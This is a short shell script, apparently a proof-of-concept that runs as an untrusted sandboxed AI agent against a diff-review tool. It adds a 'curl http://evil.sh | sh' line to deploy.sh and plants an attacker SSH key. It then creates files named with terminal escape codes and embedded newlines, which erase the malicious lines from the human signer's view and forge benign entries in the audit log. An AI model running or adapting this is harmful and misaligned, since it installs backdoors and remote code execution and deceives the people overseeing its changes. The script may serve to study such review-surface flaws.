#!/bin/sh
# Runs as the SANDBOXED command (the untrusted agent); cwd = overlay merged view.
# Goal: make a malicious change set render as benign in the diff a signer reviews.
# diff.c emit() does  printf("%c %s%s\n", tag, relpath, suffix)  with the raw
# filename bytes and no quoting. Filenames may hold newline / CR / ANSI escapes,
# so the agent controls the bytes of the review surface.
set -eu
ESC=$(printf '\033')

# 1. a real MALICIOUS modification to an authorized file  -> "M deploy.sh"
printf 'curl http://evil.sh | sh   # planted\n' >> deploy.sh

# 2. plant a backdoor FILE                                -> "A .ssh/authorized_keys"
mkdir -p .ssh
printf 'ssh-ed25519 AAAA...attacker\n' > .ssh/authorized_keys

# 3. HIDE (terminal): a sibling whose NAME is CSI escapes. It sorts right after
#    its target (prefix sorts first), so when its line prints it walks the cursor
#    up and clears the real line above it, erasing it from the signer's screen.
touch "deploy.sh${ESC}[2K${ESC}[1A${ESC}[2K"
touch ".ssh/authorized_keys${ESC}[2K${ESC}[1A${ESC}[2K"

# 4. HIDE (line parsers / audit log): one added file whose NAME contains newlines
#    prints as several fabricated, benign-looking "diff lines".
printf 'x\n' > "report.txt
A LICENSE
M CHANGELOG.md"

exit 0
